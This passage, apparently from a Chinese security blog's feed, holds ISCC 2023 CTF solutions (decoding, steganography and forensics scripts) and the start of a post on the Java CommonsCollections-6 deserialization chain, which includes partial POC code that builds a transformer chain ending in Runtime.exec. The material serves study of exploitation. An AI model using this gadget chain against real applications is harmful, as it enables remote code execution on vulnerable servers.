&gt; ord(arr[j + 1]):\n                arr[j], arr[j + 1] = arr[j + 1], arr[j]\n\n    # 将排序后的字符数组转换回字符串\n    sorted_string = ''.join(arr)\n    return sorted_string\n\n\ninput_string = &quot;YouAresoClever&quot;\nsorted_string = bubble_sort(input_string)\nprint(sorted_string)\n</code></pre>\n<p ACYeeeloorrsuv=\"\">此脚本会输出：ACYeeeloorrsuv，所以密钥为 ISCC</p>\n<p>这里的 01 是密文转换为 2 进制的形式，按照 8bit 一个字节转换，最后异或密钥得到 flag<br />\n 脚本如下</p>\n<pre><code class=\"language-python\">binary_string = &quot;0000000000000000000000000000000000000000001010010000000100110000010101010011011000011100001101000010100100110101010000000010011000110111010010100010011000000000&quot;\nbyte_list = [int(binary_string[i : i + 8], 2) for i in range(0, len(binary_string), 8)]\nsecret_key = &quot;ISCC&#123;ACYeeeloorrsuv&#125;&quot;\nflag = &quot;&quot;\nfor i in range(len(byte_list)):\n    flag += chr(ord(secret_key[i]) ^ byte_list[i])\nprint(flag)\n</code></pre>\n<p hBi0SyXFZ2TD?P=\"\">得到 flag：ISCC</p>\n<h3 id=\"狂彪-1\"><a class=\"anchor\" href=\"#狂彪-1\">#</a> 《狂彪》-1</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242222653.gif\" alt=\"img\" /></p>\n<p>Get_flag 需要三个参数，</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242222653.gif\" alt=\"img\" /></p>\n<p>之后输出按照这种标准输出就可以</p>\n<p>脚本</p>\n<pre><code class=\"language-python\">mod = 46\nm = 0x50d7c32f4a659\nn = &quot;4-chloroisatin&quot;\np = &quot;Ammosamide B&quot;\nmod_out = (int((m % 100000) % mod)) ^ (mod * (int)(m % 100000))\nflag = &quot;ISCC&#123;&quot; + str(mod_out) + &quot;_&quot; + n + &quot;_&quot; + str(m) + &quot;_&quot; + p + &quot;&#125;&quot;\nprint(flag)\n</code></pre>\n<p 2449069_4-chloroisatin_1422201965553241_Ammosamide=\"\" B=\"\">得到 flag：ISCC</p>\n<h3 id=\"crackmeplease\"><a class=\"anchor\" href=\"#crackmeplease\">#</a> CrackMePlease</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242222639.gif\" alt=\"img\" /></p>\n<p>程序实现了一个自解密结构，所以我们需要将程序运行到第 64 行，就可以得到 flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242222645.jpg\" alt=\"IMG_256\" /></p>\n<p>这里 flag 多了 “{EASY” 是因为在第 60 行调用了 sub_48784B 函数，将传入的 “EASY” 赋给了输入，所以去掉。</p>\n<p P-*BUtn=\"\">得到 flag:ISCC</p>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"好看的维吾尔族小姐姐\"><a class=\"anchor\" href=\"#好看的维吾尔族小姐姐\">#</a> 好看的维吾尔族小姐姐</h3>\n<p>16 进制编辑器修改图片高度</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251118115.png\" alt=\"image-20230525111822991\" /></p>\n<p>发现是 DM 码，水平翻转后识别信息</p>\n<pre><code>;521#&amp;;33#&amp;;101#&amp;;011#&amp;;111#&amp;;001#&amp;;801#&amp;;801#&amp;;101#&amp;;911#&amp;;59#&amp;;611#&amp;;501#&amp;;59#&amp;;611#&amp;;111#&amp;;301#&amp;;59#&amp;;711#&amp;;111#&amp;;121#&amp;;321#&amp;;76#&amp;;76#&amp;;38#&amp;;37#&amp;\n</code></pre>\n<p>得到的是翻转后的 Unicode 的编码，这里翻转后解码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251129578.png\" alt=\"image-20230525112957478\" /></p>\n<h3 id=\"人生之路\"><a class=\"anchor\" href=\"#人生之路\">#</a> 人生之路</h3>\n<p>压缩包的密码：人生之路.jpeg</p>\n<p>打开 flag.txt</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251133105.png\" alt=\"image-20230525113336977\" /></p>\n<pre><code>jFgOyFgOjF gFyOjFyOgF gFyFjF gFyFjF gOyOgOjOyOjO gFyFjFcOgO yFcOjOjcOygOyjO gFcFjFyFyjO gFyFjFcOgO yOyjOjcOcO yOyjOjcOcO yFcOjFcOyF gFcFjFyFyjO yFjFcFgF cFyjOcjOyF yOyjOjcOcO yFjFcFgF yFcFjFyOgFjFyO yjFcgOcjOygF jFgFyFgOjF jOyOjOgOyOgO \n</code></pre>\n<pre><code class=\"language-python\">import string\nc=&quot;&quot;.strip()\na=c.split(&quot; &quot;)\na=list(a[0])\np=0\nfor i in a:\n    if i in string.ascii_lowercase:\n        i=chr((ord(i)-97+p)%26+97)\n        while i not in &quot;wasd&quot;:\n            i=chr((ord(i)-97+1)%26+97)\n            p+=1\n    elif i in string.ascii_uppercase:\n        i=chr((ord(i)-65+p)%26+65)\n        while i not in &quot;ZI&quot;:\n            i=chr((ord(i)-65+1)%26+65)\n            p+=1\na=list(c)\nfor i in range(len(a)):\n    if a[i]==&quot; &quot;:\n        pass\n    else:\n        if a[i] in string.ascii_lowercase:\n            a[i]=chr((ord(a[i])-97+p)%26+97)\n        elif a[i] in string.ascii_uppercase:\n            a[i]=chr((ord(a[i])-65+p)%26+65)\na=&quot;&quot;.join(a)\na=a.split(&quot; &quot;)\nmap=&#123;\n    &quot;saIsIwIdIwaIsdIsI&quot;: &quot;A&quot;,\n    &quot;sZwZdZsZaZdZsZaZ&quot;: &quot;B&quot;,\n    &quot;aZsZdZ&quot;: &quot;C&quot;,\n    &quot;sZwZdZsZaZ&quot;: &quot;D&quot;,\n    &quot;dZaZsIdZaZsIdZ&quot;: &quot;E&quot;,\n    &quot;dZaZsZaIdZ&quot;: &quot;F&quot;,\n    &quot;aZsZdZwIaI&quot;: &quot;G&quot;,\n    &quot;sZwIdZwIsZ&quot;: &quot;H&quot;,\n    &quot;dZaIsZaIdZ&quot;: &quot;I&quot;,\n    &quot;dZaIsZaI&quot;: &quot;J&quot;,\n    &quot;sZwIdIdwIsaIsdI&quot;: &quot;K&quot;,\n    &quot;sZdZ&quot;: &quot;L&quot;,\n    &quot;wZsdIwdIsZ&quot;: &quot;M&quot;,\n    &quot;wZsdZwZ&quot;: &quot;N&quot;,\n    &quot;sZdZwZaZ&quot;: &quot;O&quot;,\n    &quot;sZwZdZsIaZ&quot;: &quot;P&quot;,\n    &quot;aZwZdZsZsdI&quot;: &quot;Q&quot;,\n    &quot;sZwZdZsIaZdZsI&quot;: &quot;R&quot;,\n    &quot;aZsIdZsIaZ&quot;: &quot;S&quot;,\n    &quot;dZaIsZ&quot;: &quot;T&quot;,\n    &quot;sZdZwZ&quot;: &quot;U&quot;,\n    &quot;sIsdIdwIwI&quot;: &quot;V&quot;,\n    &quot;sdZwdZsdZwdZ&quot;: &quot;W&quot;,\n    &quot;sdZwaIwdIsaZ&quot;: &quot;X&quot;,\n    &quot;sdIwdIsaIsI&quot;: &quot;Y&quot;,\n    &quot;dZsaZdZ&quot;: &quot;Z&quot;,\n    &quot;aIsIaIdIsIdI&quot;: &quot;&#123;&quot;,\n    &quot;dIsIdIaIsIaI&quot;: &quot;&#125;&quot;\n&#125;\nfor i in a:\n    print(map[i],end='')\nprint()\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251134034.png\" alt=\"image-20230525113443935\" /></p>\n<h3 id=\"汤姆历险记\"><a class=\"anchor\" href=\"#汤姆历险记\">#</a> 汤姆历险记</h3>\n<p>解压文件后用 foremost 分离图片得到一个压缩包</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251138690.png\" alt=\"image-20230525113805591\" /></p>\n<p>解压发现有密码，去图片中寻找密码，在文件最后发现一串字符串</p>\n<pre><code class=\"language-python\">alphabet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\\\&#123;\\\\&#125;[]&quot;\nstrings = open('./flag.txt').read()\n\nresult = &#123;&#125;\nfor i in alphabet:\n\tcounts = strings.count(i)\n\ti = '&#123;0&#125;'.format(i)\n\tresult[i] = counts\n\nres = sorted(result.items(),key=lambda item:item[1],reverse=True)\nfor data in res:\n\tprint(data)\n\nfor i in res:\n\tflag = str(i[0])\n\tprint(flag[0],end=&quot;&quot;)\n    #&#123;yasuobpwrd91702!@$%^&amp;*&#125;\n</code></pre>\n<p>字频统计后得到密码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251150808.png\" alt=\"image-20230525115028689\" /></p>\n<p>解压后得到一段文本</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251153349.png\" alt=\"image-20230525115302186\" /></p>\n<p>根据行距解摩斯</p>\n<pre><code>..-.-..-..-.-..--.-\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251208633.png\" alt=\"image-20230525120850474\" /></p>\n<p>然后用 dictionary 中对应的字符串替换</p>\n<h3 id=\"菜鸟黑客1\"><a class=\"anchor\" href=\"#菜鸟黑客1\">#</a> 菜鸟黑客 1</h3>\n<p>这里发现其是一个镜像文件，这里通过 R-studio 加载后再桌面找到了 flag.txt</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251302394.png\" alt=\"image-20230525130216242\" /></p>\n<p>是一个 des，用题目给到的 key 解密</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251303783.png\" alt=\"image-20230525130351623\" /></p>\n<h3 id=\"mystery-of-bits\"><a class=\"anchor\" href=\"#mystery-of-bits\">#</a> mystery of bits</h3>\n<p>更改图片高度</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251800360.png\" alt=\"image-20230525180010008\" /></p>\n<p>用 stegSolve 打开</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251906656.png\" alt=\"image-20230525190612575\" /></p>\n<p>翻转一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251916588.png\" alt=\"image-20230525191645533\" /></p>\n<p>ysafao245hfdisi，解压后得到一个 wav 文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251934620.png\" alt=\"image-20230525193428558\" /></p>\n<p>这里分解得到一串 01，很明显是像素位</p>\n<pre><code class=\"language-perl\">0000000000000000000000000000000011111110101010111111101111111001000001011101011100000100000100101110101111000111110010111010010111010101000000101001011101001011101010110100101000101110100100000100010110000001010000010011111110101010101010101111111000000000010011001101000000000000010101101010101010111110111110011110000111111100010100101110000010111010010110110101101111000011100000011100000111000001110001001011101001011010010110100000000110100000111000001110000000001011101001011010010110100100010001101001100111011101010100001010011111010110011101001111100000011001100100001101100101000010100010011000010000011000100001011100001011001110110110100100101011100111110101111111101100000000000100001010110100010001001111111001000110010010101010000100000101101111001001000111110010111010011101110101111110101001011101010111011001101110101000101110100010111010101110111010010000010110011001000110011110001111111000010001000010010100000000000000000000000000000000000\n</code></pre>\n<p>转二维码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251946238.png\" alt=\"image-20230525194647169\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251947377.png\" alt=\"image-20230525194716316\" /></p>\n<h3 id=\"通信方式\"><a class=\"anchor\" href=\"#通信方式\">#</a> 通信方式</h3>\n<p>用 au 打开发现有两个声道，这里计算一下左右声道的差值</p>\n<pre><code class=\"language-python\">import wave\n\n# 打开wav文件\nwav_file = wave.open('telegram2wechat.wav', 'r')\n\n# 获取声道数和采样率\nnum_channels = wav_file.getnchannels()\nsample_rate = wav_file.getframerate()\n\n# 读取所有采样点\nframes = wav_file.readframes(-1)\n\n# 关闭文件\nwav_file.close()\n\n# 将所有数据转换为整数\nsamples = list(map(\n    lambda x: int.from_bytes(x, byteorder='little', signed=True),\n    zip(frames[0::2], frames[1::2])\n))\n\n# 分离左右声道\nleft_channel = samples[::num_channels]\nright_channel = samples[1::num_channels]\n\n# 计算左右声道的差值\ndiff = [left - right for left, right in zip(left_channel, right_channel)]\n\n# 输出差值\nprint(diff)\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251238553.png\" alt=\"image-20230525123810382\" /></p>\n<p>中间有段不一样的，这里提取出来，1 转成 0，2 替换成 1，把逗号和空格都去了</p>\n<pre><code class=\"language-python\">import wave\n\n# 打开wav文件\nwav_file = wave.open('telegram2wechat.wav', 'r')\n\n# 获取声道数和采样率\nnum_channels = wav_file.getnchannels()\nsample_rate = wav_file.getframerate()\n\n# 读取所有采样点\nframes = wav_file.readframes(-1)\n\n# 关闭文件\nwav_file.close()\n\n# 将所有数据转换为整数\nsamples = list(map(\n    lambda x: int.from_bytes(x, byteorder='little', signed=True),\n    zip(frames[0::2], frames[1::2])\n))\n\n# 分离左右声道\nleft_channel = samples[::num_channels]\nright_channel = samples[1::num_channels]\n\n# 计算左右声道的差值\ndiff = [left - right for left, right in zip(left_channel, right_channel)]\n\np = [d for d in diff if d in [1, 2]]\n\nwith open('output.txt', 'w') as f:\n    f.write(str(p))\n\nwith open('output.txt', 'r') as f:\n    content = f.read().replace(',', '').replace(' ', '')\n    content = content.replace('1', '0').replace('2', '1')\n    # print(content)\n    binary_str=str(content)\n\nprint(binary_str)\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251241865.png\" alt=\"image-20230525124129737\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251244726.png\" alt=\"image-20230525124427569\" /></p>\n<p>中文电码在线转一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251252689.png\" alt=\"image-20230525125205545\" /></p>\n<p>这里写脚本对照一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251254355.png\" alt=\"image-20230525125425194\" /></p>\n<h3 id=\"菜鸟黑客-2\"><a class=\"anchor\" href=\"#菜鸟黑客-2\">#</a> 菜鸟黑客 - 2</h3>\n<p>使用 volatility 工具将 jpg 文件分离</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251333307.png\" alt=\"image-20230525133308061\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251337799.png\" alt=\"image-20230525133710670\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251336235.png\" alt=\"image-20230525133654160\" /></p>\n<p>foremost 分离后得到一个压缩包，密码还是 ISCC2023</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251338338.png\" alt=\"image-20230525133846257\" /></p>\n<p>加下来寻找这个密钥，在 mspaint 程序中</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251340315.png\" alt=\"image-20230525134019241\" /></p>\n<p>使用 gimp 分离得到</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251342931.png\" alt=\"image-20230525134225826\" /></p>\n<p>这里提示表情是摩斯，这里解码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251343712.png\" alt=\"image-20230525134346613\" /></p>\n<p>解维吉尼亚</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251345280.png\" alt=\"image-20230525134554203\" /></p>\n<h3 id=\"消息传递\"><a class=\"anchor\" href=\"#消息传递\">#</a> 消息传递</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251624725.png\" alt=\"image-20230525162418604\" /></p>\n<p>这里发现一个压缩包文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251621323.png\" alt=\"image-20230525162140152\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251622028.png\" alt=\"image-20230525162218914\" /></p>\n<p>拼接后 pass：WRWAALIUWOHZAPQWFTQIPMVJFOKHHZUZ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251626707.png\" alt=\"image-20230525162658563\" /></p>\n<p>百块是 1，黑块是 0，解码即可</p>\n<h3 id=\"你相信ai吗\"><a class=\"anchor\" href=\"#你相信ai吗\">#</a> 你相信 AI 吗？</h3>\n<p>这里在 dataset 文件下面有 79 个存放像素信息的文本这里先将其转换为图片</p>\n<pre><code class=\"language-python\">import cv2\nimport numpy as np\n\nfor i in range(32):\n    with open(f&quot;&#123;i&#125;.txt&quot;, &quot;r&quot;) as f:\n        data = f.read().splitlines()\n    image_data = np.array([float(line) for line in data])\n    if image_data.shape[0] == 2352:\n        cv2.imwrite(f&quot;./out/&#123;i&#125;.png&quot;, image_data.reshape(84, 28))\n        print(1)\n    elif image_data.shape[0] == 1568:\n        cv2.imwrite(f&quot;./out/&#123;i&#125;.png&quot;, image_data.reshape(56, 28))\n        print(2)\n    else:\n        print(i)\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251639491.png\" alt=\"image-20230525163908349\" /></p>\n<p>这里对图片信息识别，按顺序肉眼提取图片上的数字，以空格分隔，跑这个脚本：</p>\n<pre><code class=\"language-python\">import string\nimport itertools\nimport contextlib\n\ndef has_visible_bytes(input_bytes):\n    return all(chr(byte) in string.printable for byte in input_bytes)\n\ncipher_text = '859 685 853 876 852 859 856 638 851 687 688 851 857 873 899 660 854 682 802 666 850 802 685 855 686 873 828 685 853 685 870 859'.split(&quot; &quot;)\n\nwith open(&quot;out.txt&quot;, &quot;wb&quot;) as f:\n    for i in itertools.permutations(&quot;0123456789&quot;, 10):\n        maktrans = str.maketrans(&quot;0123456789&quot;, ''.join(i))\n\n        lis = [str.translate(i, maktrans) for i in cipher_text]\n        \n        with contextlib.suppress(Exception):\n            plan_text = bytes(list(map(lambda x: int(x), lis)))\n            if has_visible_bytes(plan_text):\n                print(plan_text)\n                f.write(plan_text + b&quot;\\n&quot;)\n</code></pre>\n<p>这里拿到一串 base64 加密后的数据，对照 ISCC 的 SVNDQ3 寻找</p>\n",
            "tags": [
                "WP",
                "ISCC"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/05/24/CommonsCollections-6/",
            "url": "https://blog.xcu.icu/2023/05/24/CommonsCollections-6/",
            "title": "ConmonsCollection-6",
            "date_published": "2023-05-23T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>也是跟着 p 牛的文章跟了一遍 CommonsCollection1 这条链子，在 CC1 中有着诸多限制，版本也是很低，当下 JDK20 在今年的 3 月份 21 正式发布，预计在本年 9 月将发布 JDK21，版本迭代的速度非常之快，原始的 cc 链只能在 jdk8u6 * 之前能够利用显然是不够的，也是需要想办法在更高版本能够利用 cc 链来进行恶意攻击</p>\n<h2 id=\"commonscollection-6\"><a class=\"anchor\" href=\"#commonscollection-6\">#</a> CommonsCollection-6</h2>\n<p>文章中所涉及的代码都在 github 项目 https://github.com/clown-q/Clown_java 中，萌新浅记，大佬轻喷</p>\n<h3 id=\"dump源码\"><a class=\"anchor\" href=\"#dump源码\">#</a> dump 源码</h3>\n<p>这里插入一点调试前的工作，因为 jdk 中是反编译的 class 文件，对调试很不友好，这里我是使用的 openjdk 的 sun 添加到外部库<span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZy5vcGVuamRrLm9yZy9qZGs4dS9qZGs4dS9qZGsvcmV2LzgxODFmOGI2ZWYwZA==\"> jdk8u/jdk8u/jdk: 8181f8b6ef0d (openjdk.org)</span> 将文件 down 下来后</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305181708443.png\" alt=\"image-20230518170826389\" /></p>\n<p>将这里的 sun 文件放到 jdk 的 src 目录下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305181709243.png\" alt=\"image-20230518170904208\" /></p>\n<p>然后在 idea 中添加一下路径</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305181711239.png\" alt=\"image-20230518171131186\" /></p>\n<h3 id=\"链子调整\"><a class=\"anchor\" href=\"#链子调整\">#</a> 链子调整</h3>\n<p>欧德克回归正题，因为在高版本中 sun.reflect.annotation.AnnotationInvocationHandler 的 readObject 方法逻辑发生了变化</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305181658731.png\" alt=\"image-20230518165822615\" /></p>\n<p>这里没有了我们所需要的 chaeck 的调用，这里就需要寻找的新的利用链，也就是这个 cc6 来解决高版本中无法利用，简单来说实际上就是在找上下⽂中是否还有其他调⽤ LazyMap#get () 的地⽅，后面的地方还是和 cc1 一样的方式调用到危险函数，其实是用到了 HashMap，所以大概 CC6=CC1+URLDNS？</p>\n<p>这里找到的是  <code>org.apache.commons.collections.keyvalue.TiedMapEntry</code>  这个类</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305181812569.png\" alt=\"image-20230518181242510\" /></p>\n<p>这里使用了 get 方法，这个 map 可控，⽽ hashCode ⽅法调⽤了 getValue ⽅法</p>\n<pre class=\"mermaid graph\"><svg id=\"mermaid-1689595118695\" width=\"100%\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" height=\"55\" style=\"max-width: 1048.78125px;\" viewBox=\"0 0 1048.78125 55\"><g><g class=\"output\"><g class=\"clusters\"></g><g class=\"edgePaths\"><g class=\"edgePath LS-a LE-b\" id=\"L-a-b\" style=\"opacity: 1;\"><path class=\"path\" d=\"M178.125,27.5L203.125,27.5L228.125,27.5\" marker-end=\"url(#arrowhead22)\" style=\"fill:none\"></path><defs><marker id=\"arrowhead22\" viewBox=\"0 0 10 10\" refX=\"9\" refY=\"5\" markerUnits=\"strokeWidth\" markerWidth=\"8\" markerHeight=\"6\" orient=\"auto\"><path d=\"M 0 0 L 10 5 L 0 10 z\" class=\"arrowheadPath\" style=\"stroke-width: 1; stroke-dasharray: 1, 0;\"></path></marker></defs></g><g class=\"edgePath LS-b LE-c\" id=\"L-b-c\" style=\"opacity: 1;\"><path class=\"path\" d=\"M423.96875,27.5L448.96875,27.5L473.96875,27.5\" marker-end=\"url(#arrowhead23)\" style=\"fill:none\"></path><defs><marker id=\"arrowhead23\" viewBox=\"0 0 10 10\" refX=\"9\" refY=\"5\" markerUnits=\"strokeWidth\" markerWidth=\"8\" markerHeight=\"6\" orient=\"auto\"><path d=\"M 0 0 L 10 5 L 0 10 z\" class=\"arrowheadPath\" style=\"stroke-width: 1; stroke-dasharray: 1, 0;\"></path></marker></defs></g><g class=\"edgePath LS-c LE-d\" id=\"L-c-d\" style=\"opacity: 1;\"><path class=\"path\" d=\"M584.265625,27.5L609.265625,27.5L634.265625,27.5\" marker-end=\"url(#arrowhead24)\" style=\"fill:none\"></path><defs><marker id=\"arrowhead24\" viewBox=\"0 0 10 10\" refX=\"9\" refY=\"5\" markerUnits=\"strokeWidth\" markerWidth=\"8\" markerHeight=\"6\" orient=\"auto\"><path d=\"M 0 0 L 10 5 L 0 10 z\" class=\"arrowheadPath\" style=\"stroke-width: 1; stroke-dasharray: 1, 0;\"></path></marker></defs></g><g class=\"edgePath LS-d LE-e\" id=\"L-d-e\" style=\"opacity: 1;\"><path class=\"path\" d=\"M872.1875,27.5L897.1875,27.5L922.1875,27.5\" marker-end=\"url(#arrowhead25)\" style=\"fill:none\"></path><defs><marker id=\"arrowhead25\" viewBox=\"0 0 10 10\" refX=\"9\" refY=\"5\" markerUnits=\"strokeWidth\" markerWidth=\"8\" markerHeight=\"6\" orient=\"auto\"><path d=\"M 0 0 L 10 5 L 0 10 z\" class=\"arrowheadPath\" style=\"stroke-width: 1; stroke-dasharray: 1, 0;\"></path></marker></defs></g></g><g class=\"edgeLabels\"><g class=\"edgeLabel\" transform=\"\" style=\"opacity: 1;\"><g transform=\"translate(0,0)\" class=\"label\"><rect rx=\"0\" ry=\"0\" width=\"0\" height=\"0\"></rect><text><tspan xml:space=\"preserve\" dy=\"1em\" x=\"1\"></tspan></text></g></g><g class=\"edgeLabel\" transform=\"\" style=\"opacity: 1;\"><g transform=\"translate(0,0)\" class=\"label\"><rect rx=\"0\" ry=\"0\" width=\"0\" height=\"0\"></rect><text><tspan xml:space=\"preserve\" dy=\"1em\" x=\"1\"></tspan></text></g></g><g class=\"edgeLabel\" transform=\"\" style=\"opacity: 1;\"><g transform=\"translate(0,0)\" class=\"label\"><rect rx=\"0\" ry=\"0\" width=\"0\" height=\"0\"></rect><text><tspan xml:space=\"preserve\" dy=\"1em\" x=\"1\"></tspan></text></g></g><g class=\"edgeLabel\" transform=\"\" style=\"opacity: 1;\"><g transform=\"translate(0,0)\" class=\"label\"><rect rx=\"0\" ry=\"0\" width=\"0\" height=\"0\"></rect><text><tspan xml:space=\"preserve\" dy=\"1em\" x=\"1\"></tspan></text></g></g></g><g class=\"nodes\"><g class=\"node default\" id=\"flowchart-a-8\" transform=\"translate(93.0625,27.5)\" style=\"opacity: 1;\"><rect rx=\"5\" ry=\"5\" x=\"-85.0625\" y=\"-19.5\" width=\"170.125\" height=\"39\" class=\"label-container\"></rect><g class=\"label\" transform=\"translate(0,0)\"><g transform=\"translate(-75.0625,-9.5)\"><text style=\"\"><tspan xml:space=\"preserve\" dy=\"1em\" x=\"1\">HashMap.readObject</tspan></text></g></g></g><g class=\"node default\" id=\"flowchart-b-9\" transform=\"translate(326.046875,27.5)\" style=\"opacity: 1;\"><rect rx=\"5\" ry=\"5\" x=\"-97.921875\" y=\"-19.5\" width=\"195.84375\" height=\"39\" class=\"label-container\"></rect><g class=\"label\" transform=\"translate(0,0)\"><g transform=\"translate(-87.921875,-9.5)\"><text style=\"\"><tspan xml:space=\"preserve\" dy=\"1em\" x=\"1\">TiredMapEntry.hashCode</tspan></text></g></g></g><g class=\"node default\" id=\"flowchart-c-11\" transform=\"translate(529.1171875,27.5)\" style=\"opacity: 1;\"><rect rx=\"5\" ry=\"5\" x=\"-55.1484375\" y=\"-19.5\" width=\"110.296875\" height=\"39\" class=\"label-container\"></rect><g class=\"label\" transform=\"translate(0,0)\"><g transform=\"translate(-45.1484375,-9.5)\"><text style=\"\"><tspan xml:space=\"preserve\" dy=\"1em\" x=\"1\">LazyMap.get</tspan></text></g></g></g><g class=\"node default\" id=\"flowchart-d-13\" transform=\"translate(753.2265625,27.5)\" style=\"opacity: 1;\"><rect rx=\"5\" ry=\"5\" x=\"-118.9609375\" y=\"-19.5\" width=\"237.921875\" height=\"39\" class=\"label-container\"></rect><g class=\"label\" transform=\"translate(0,0)\"><g transform=\"translate(-108.9609375,-9.5)\"><text style=\"\"><tspan xml:space=\"preserve\" dy=\"1em\" x=\"1\">ChainedTransformer.transform</tspan></text></g></g></g><g class=\"node default\" id=\"flowchart-e-15\" transform=\"translate(981.484375,27.5)\" style=\"opacity: 1;\"><rect rx=\"5\" ry=\"5\" x=\"-59.296875\" y=\"-19.5\" width=\"118.59375\" height=\"39\" class=\"label-container\"></rect><g class=\"label\" transform=\"translate(0,0)\"><g transform=\"translate(-49.296875,-9.5)\"><text style=\"\"><tspan xml:space=\"preserve\" dy=\"1em\" x=\"1\">Runtime.exec</tspan></text></g></g></g></g></g></g></svg></pre><pre><code class=\"language-java\">package CommonsCollection.Clown_CC6;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class POC1 &#123;\n    public static void Serialization(Object object) throws Exception&#123;\n        FileOutputStream fileOutputStream = new FileOutputStream(&quot;poc1.txt&quot;);\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);\n        objectOutputStream.writeObject(object);\n        System.out.println(&quot;output serialization&quot;);\n    &#125;\n    public static void Unserialization() throws Exception&#123;\n        FileInputStream fileInputStream = new FileInputStream(&quot;poc1.txt&quot;);\n        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);\n        objectInputStream.readObject();\n        System.out.println(&quot;input unserialization&quot;);\n    &#125;\n\n    public static void main(String[] args) throws Exception&#123;\n        Transformer[] transformers = new Transformer[]&#123;\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class, Class[].class&#125;,new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;),\n                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),\n                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new String[] &#123;&quot;calc&quot; &#125;),\n        &#125;;\n        Transformer chainedTransformer = new ChainedTransformer(transformers);\n\n        HashMap map = new HashMap();\n        Map lazymap = 